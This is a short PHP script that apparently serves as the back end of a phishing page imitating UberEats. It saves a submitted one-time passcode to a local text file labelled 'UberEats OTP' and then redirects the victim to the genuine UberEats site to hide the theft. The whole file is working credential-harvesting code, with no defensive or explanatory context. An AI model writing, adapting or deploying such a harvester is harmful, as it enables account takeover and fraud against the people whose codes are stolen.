<?php
file_put_contents("otp.txt", "UberEats OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.ubereats.com/');
?>
